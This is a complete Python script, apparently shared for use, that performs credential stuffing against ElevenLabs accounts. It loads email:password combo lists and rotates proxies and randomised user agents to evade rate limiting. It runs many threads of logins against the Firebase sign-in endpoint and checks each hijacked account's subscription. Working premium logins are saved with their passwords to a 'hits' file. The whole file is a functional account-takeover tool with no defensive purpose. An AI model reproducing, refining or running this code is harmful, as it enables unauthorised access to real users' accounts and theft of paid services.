import os
import random
import requests
import time
import warnings
import threading
import shutil
from queue import Queue
from datetime import datetime
from colorama import init, Fore, Style
from user_agent import generate_user_agent
from urllib.parse import urlparse

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Code By - @LEGEND_BL
# Multiple User Agent configurations for better rotation
UA_CONFIGS = [
    {'os': 'win', 'navigator': 'chrome'},
    {'os': 'win', 'navigator': 'firefox'},
    {'os': 'win', 'navigator': 'ie'},
    {'os': 'mac', 'navigator': 'chrome'},
    {'os': 'mac', 'navigator': 'firefox'},
    {'os': 'linux', 'navigator': 'chrome'},
    {'os': 'linux', 'navigator': 'firefox'},
    {'os': 'android', 'navigator': 'chrome'},
]

def get_random_user_agent():
    """Generate a random user agent from multiple OS/browser combinations"""
    try:
        config = random.choice(UA_CONFIGS)
        return generate_user_agent(os=config['os'], navigator=config['navigator'])
    except:
        # Fallback to default if specific config fails
        return generate_user_agent()

# Detect if requests[socks] is available
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'ELEVENLABS CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")

# FIX: Strip quotes from input - handles drag & drop files with quotes
combo_input = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"

proxy_input = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip()
proxy_file = proxy_input.strip('"').strip("'").strip() or "proxy.txt"

# Code By - @LEGEND_BL
def load_combos(fn):
    """Load combos from file with proper quote handling"""
    try:
        # FIX: Strip quotes from filename - fixes OSError: [Errno 22] Invalid argument
        fn = fn.strip().strip('"').strip("'").strip()
        
        # Check if file exists first
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        
        with open(fn, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except OSError as e:
        print(f"{Fore.RED}[-] Error opening file: {e}")
        print(f"{Fore.YELLOW}[!] Tip: Remove quotes from the filename if present")
        return []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

# Code By - @LEGEND_BL
def load_proxies(fn):
    """Load proxies from file with proper quote handling"""
    try:
        # FIX: Strip quotes from filename
        fn = fn.strip().strip('"').strip("'").strip()
        
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        
        with open(fn, encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
            if not proxies:
                return []
            return proxies
    except OSError as e:
        print(f"{Fore.RED}[-] Error opening proxy file: {e}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

# Code By - @LEGEND_BL
def detect_proxy_type(proxy_str):
    """
    Detect proxy type from proxy string.
    Supported formats:
    - http://host:port or https://host:port
    - socks4://host:port
    - socks5://host:port or socks5h://host:port
    - host:port (defaults to http)
    - host:port:username:password (defaults to http with auth)
    - username:password@host:port (defaults to http with auth)
    - protocol://username:password@host:port (explicit protocol with auth)
    """
    proxy_str = proxy_str.strip()
    
    # Check if it starts with a protocol
    if "://" in proxy_str:
        protocol = proxy_str.split("://")[0].lower()
        return protocol
    
    # Default to http if no protocol specified
    return "http"

# Code By - @LEGEND_BL
def format_proxy(p):
    """
    Advanced proxy formatter supporting HTTP, HTTPS, SOCKS4, and SOCKS5.
    Formats:
    1. protocol://host:port
    2. protocol://username:password@host:port
    3. host:port (defaults to http)
    4. host:port:username:password (defaults to http)
    5. username:password@host:port (defaults to http)
    """
    if not p:
        return None
    
    p = p.strip()
    proxy_type = detect_proxy_type(p)
    
    # Handle protocol://... format
    if "://" in p:
        protocol = p.split("://")[0].lower()
        rest = p.split("://", 1)[1]
        
        # Check if SOCKS proxy is being used but socks library is not available
        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
            return None
        
        # Parse authentication if present
        if "@" in rest:
            auth_part, host_part = rest.rsplit("@", 1)
            if ":" in auth_part:
                username, password = auth_part.split(":", 1)
                proxy_url = f"{protocol}://{username}:{password}@{host_part}"
            else:
                proxy_url = f"{protocol}://{rest}"
        else:
            proxy_url = f"{protocol}://{rest}"
        
        # For HTTP/HTTPS proxies, use both http and https keys
        if protocol in ['http', 'https']:
            return {
                "http": proxy_url,
                "https": proxy_url
            }
        # For SOCKS proxies, use both http and https keys with socks protocol
        elif protocol in ['socks4', 'socks5', 'socks5h']:
            return {
                "http": proxy_url,
                "https": proxy_url
            }
    
    # Handle username:password@host:port format (no protocol)
    elif "@" in p:
        auth_part, host_part = p.rsplit("@", 1)
        if ":" in auth_part:
            username, password = auth_part.split(":", 1)
            proxy_url = f"http://{username}:{password}@{host_part}"
            return {
                "http": proxy_url,
                "https": proxy_url
            }
    
    # Handle host:port:username:password format
    parts = p.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    # Handle host:port format (no auth, defaults to http)
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    
    return None

# Code By - @LEGEND_BL
combos = load_combos(combo_file)
proxies = load_proxies(proxy_file)
# Code By - @LEGEND_BL
if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()

# Proxy mode selection
use_proxies = True
if not proxies:
    print(f"{Fore.YELLOW}[!] No proxies found in {proxy_file}")
    mode_input = input(f"{Fore.CYAN}Check accounts WITHOUT proxy? (y/n, default: n): {Style.RESET_ALL}").strip().lower()
    if mode_input == 'y':
        use_proxies = False
        print(f"{Fore.YELLOW}[*] Proxy-less mode: Will check {len(combos)} accounts\n")
    else:
        input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
        exit()
else:
    # Check for SOCKS support
    if not SOCKS_AVAILABLE:
        # Check if any proxy is SOCKS type
        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
        if has_socks:
            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.")
            print(f"{Fore.YELLOW}[!] Install with: pip install requests[socks]")
            print(f"{Fore.YELLOW}[!] SOCKS proxies will be skipped.\n")

# Code By - @LEGEND_BL
if use_proxies:
    threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
    threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))
else:
    # Proxy-less mode: use only 1 thread to avoid rate limiting
    threads_count = 1
    print(f"{Fore.YELLOW}[*] Using 1 thread for proxy-less mode (to avoid rate limits)\n")

# Code By - @LEGEND_BL
if use_proxies:
    print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")
else:
    print(f"{Fore.CYAN}Loaded {len(combos)} combos | No proxies (direct connection) | Threads: {threads_count}\n")
print(f"{Fore.BLUE}[*] Starting checker...!\n")
# Code By - @LEGEND_BL
hit_counter = free_counter = fail_counter = mfa_counter = unverified_counter = 0
counters_lock = threading.Lock()
print_lock = threading.Lock()
result_counter = 0

# Code By - @LEGEND_BL
def parse(text, left, right):
    start = text.find(left)
    if start == -1: return ""
    start += len(left)
    end = text.find(right, start)
    if end == -1: return ""
    return text[start:end]
# Code By - @LEGEND_BL
def parse_error_message(data):
    if not isinstance(data, dict):
        return "Unknown error"
    error = data.get("error", {})
    message = str(error.get("message", ""))

    if "BLOCKING_FUNCTION_ERROR_RESPONSE" in message:
        if "not been verified" in message or "PERMISSION_DENIED" in message:
            return "Email not verified"

    if "mfaPendingCredential" in data or "mfaInfo" in data:
        return "2FA Required"

    if message:
        if "INVALID_LOGIN_CREDENTIALS" in message:
            return "Invalid credentials"
        if "TOO_MANY_ATTEMPTS" in message:
            return "Rate limited"
        if "USER_DISABLED" in message:
            return "Account disabled"
        return message

    return "Login failed"
# Code By - @LEGEND_BL
def worker(q):
    global result_counter, hit_counter, free_counter, fail_counter, mfa_counter, unverified_counter
    while True:
        try:
            combo = q.get_nowait()
        except:
            break

        email, pwd = combo.split(":", 1)
        proxy_dict = None
        
        # Get proxy if using proxy mode
        if use_proxies:
            for _ in range(3):
                proxy_str = random.choice(proxies)
                proxy_dict = format_proxy(proxy_str)
                if proxy_dict: break

            if not proxy_dict:
                with counters_lock: fail_counter += 1
                with counters_lock: num = result_counter + 1; result_counter = num
                with print_lock:
                    print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy")
                q.task_done()
                continue
        # Proxy-less mode: no proxy used
        else:
            proxy_dict = None

        s = requests.Session()
        # Generate random user agent from multiple OS/browser combos
        userA = get_random_user_agent()

        result = "failed"
        reason = "Unknown error"
        display_plan = plan_type = char_limit = reset_date = "N/A"

        success = False
        for attempt in range(3):
            try:
                login_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBSsRE_1Os04-bxpd5JTLIniy3UK4OqKys"
                headers = {
                    "Host": "identitytoolkit.googleapis.com",
                    "User-Agent": userA,
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "X-Client-Version": "Firefox/JsCore/10.7.1/FirebaseCore-web",
                    "X-Firebase-Gmpid": "1:265222077342:web:3acce90d1596672570348f",
                    "Origin": "https://elevenlabs.io",
                    "Referer": "https://elevenlabs.io/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "Priority": "u=0",
                    "Te": "trailers"
                }
                payload = {
                    "email": email,
                    "password": pwd,
                    "returnSecureToken": True,
                    "clientType": "CLIENT_TYPE_WEB"
                }

                r = s.post(login_url, json=payload, headers=headers, proxies=proxy_dict, timeout=25, verify=False)
                data = r.json()

                if "idToken" in data:
                    Token = data["idToken"]
                    sub_url = "https://api.us.elevenlabs.io/v1/user/subscription"
                    sub_headers = {
                        "Host": "api.us.elevenlabs.io",
                        "accept": "*/*",
                        "accept-language": "en-US",
                        "authorization": f"Bearer {Token}",
                        "cache-control": "no-cache",
                        "content-type": "application/json",
                        "origin": "https://elevenlabs.io",
                        "pragma": "no-cache",
                        "priority": "u=1, i",
                        "referer": "https://elevenlabs.io/",
                        "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": '"Android"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site",
                        "user-agent": userA
                    }

                    r2 = s.get(sub_url, headers=sub_headers, proxies=proxy_dict, timeout=25, verify=False)
                    src = r2.text

                    tier = parse(src, '"tier":"', '"').lower()

                    if tier == "free" or '"status":"free"' in src:
                        result = "free"
                    else:
                        plan_name = parse(src, '"tier":"', '"')
                        plan_map = {"starter":"Starter","creator":"Creator","pro":"Pro","scale":"Scale","business":"Business","enterprise":"Enterprise"}
                        display_plan = plan_map.get(plan_name.lower(), plan_name.capitalize())
                        plan_type = parse(src, '"billing_period":"', '"').replace("_period", "").capitalize()
                        char_limit = parse(src, '"character_limit":', ',')
                        reset_unix = parse(src, '"next_character_count_reset_unix":', ',')
                        currency = parse(src, '"currency":', ',').strip('"') or "USD"
                        reset_date = datetime.fromtimestamp(int(reset_unix)).strftime("%d-%m-%Y") if reset_unix and reset_unix.isdigit() else "N/A"

                        info = f"Plan: {display_plan} | Type: {plan_type} | Limit: {char_limit} | Reset: {reset_date} | Currency: {currency}"
                        with open("ElevenLabs_Premium.txt", "a", encoding="utf-8") as f:
                            f.write(f"{email}:{pwd} | {info} | Code By - @LEGEND_BL\n")

                        result = "premium"
                        with counters_lock: hit_counter += 1

                    success = True
                    break

                else:
                    reason = parse_error_message(data)
                    if "2FA Required" in reason:
                        result = "2fa"
                        with counters_lock: mfa_counter += 1
                    elif "Email not verified" in reason:
                        result = "unverified"
                        with counters_lock: unverified_counter += 1
                    else:
                        result = "failed"
                        with counters_lock: fail_counter += 1
                    break

            except requests.exceptions.RequestException:
                reason = "Timeout / Bad proxy"
                time.sleep(3 + attempt * 2)
            except:
                reason = "Request failed"
                time.sleep(2)

        with counters_lock: num = result_counter + 1; result_counter = num

        if result == "failed":
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason}")
        elif result == "free":
            with counters_lock: free_counter += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.YELLOW}{email}:{pwd} | Status: Free")
        elif result == "premium":
            info = f"Plan: {display_plan} | Type: {plan_type} | Limit: {char_limit} | Reset: {reset_date}"
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | {info}")
        elif result == "2fa":
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.MAGENTA}{email}:{pwd} | 2FA Required")
        elif result == "unverified":
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.CYAN}{email}:{pwd} | Email not verified")

        q.task_done()
        time.sleep(3)
# Code By - @LEGEND_BL
def main():
    q = Queue()
    for c in combos:
        q.put(c)

    open("ElevenLabs_Premium.txt", "w").close()

    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()

    q.join()
# Code By - @LEGEND_BL
    print(f"\n{Fore.CYAN}Finished...!")
    print(f"{Fore.GREEN}Premium: {hit_counter} | {Fore.YELLOW}Free: {free_counter} | {Fore.MAGENTA}2FA: {mfa_counter} | {Fore.CYAN}Unverified: {unverified_counter} | {Fore.RED}Failed: {fail_counter}")
    print(f"{Fore.CYAN}Premium hits saved to ElevenLabs_Premium.txt")
    input(f"\nPress Enter to exit...")
# Code By - @LEGEND_BL
if __name__ == "__main__":
    main()
